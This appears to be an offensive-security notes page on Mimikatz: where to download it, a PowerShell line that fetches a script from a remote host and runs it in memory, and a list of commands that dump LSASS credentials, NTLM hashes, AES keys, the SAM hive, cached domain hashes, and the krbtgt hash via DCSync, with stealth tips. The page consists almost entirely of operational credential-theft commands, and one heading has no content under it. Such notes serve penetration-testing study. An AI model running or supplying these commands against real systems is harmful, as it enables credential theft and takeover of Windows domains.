## Downloading Mimikatz

The mimikatz project by Benjamin Delphy is truly extraordinary. It can be used to extract all sorts of information from a target once you have SYSTEM level privileges. Here we'll look at some basic commands aswell as their OPSEC concerns.

Note: The Powershell version sometimes has weird compatability issues. There's multiple versions floating about.

✨✨ https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1 ✨✨

✨✨ https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1 ✨✨

Download the compiled binaries here:

✨✨ https://github.com/ParrotSec/mimikatz ✨✨

```powershell
# Load mimikatz into memory from Powershell and run a command
IEX((New-Object System.Net.WebClient).downloadString('http://10.10.10.10/Invoke-Mimikatz.ps1'))
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'

# Run the binary on the target
mimikatz.exe 
```

## Oh no, they've protected LSASS with PPL



## Useful Commands

Here are my most memorable commands from my notes. There's tons more, though, so don't be afraid to look further.

```powershell
# Escalate to SYSTEM from HIGH privilege (Admin) session
privlege::debug 

# Dump cached LSASS credentials - Dumps NTLM hashes 
sekurlsa::logonpasswords

# Dump ekeys from LSASS - Consider this an upgrade on finding NTLM hashes. Using AES128/256 keys is more stealthy as they're default in domain environments since Windows Server 2012
sekurlsa::ekeys

# Dump the SAM hive
lsadump::sam

# Dump out secrets from the local security authority
lsadump::secrets

# Dump out any Domain Cached Credentials. These are $DCC2$ hashes and can be cracked with -m 2100 in hashcat
lsadump::cache

# View stored credentials in the Credential Manager
vault::list

# Purge your ticket
kerberos::purge

# Pass in a .kirbi to your current users cache
kerberos::ptt C:\my_tgt.kirbi

# DCSync to dump out the krbtgt hash amongst others
lsadump::dcsync /domain:MATRIX.local /user:MATRIX\krbtgt
```

